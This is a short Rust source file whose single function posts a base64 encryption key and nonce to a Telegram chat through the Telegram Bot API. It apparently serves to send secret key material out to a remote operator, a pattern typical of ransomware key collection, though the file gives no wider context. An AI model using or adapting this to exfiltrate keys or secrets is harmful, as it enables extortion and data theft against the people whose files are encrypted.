use reqwest::blocking::Client;
use serde_json::json;

pub fn send_to_telegram(
    telegram_token: &str,
    chat_id: &str,
    key_b64: &str,
    nonce_b64: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    let client = Client::new();
    client
        .post(&format!(
            "https://api.telegram.org/bot{}/sendMessage",
            telegram_token
        ))
        .json(&json!({
            "chat_id": chat_id,
            "text": format!("Key: {}\nNonce: {}", key_b64, nonce_b64)
        }))
        .send()?;
    Ok(())
}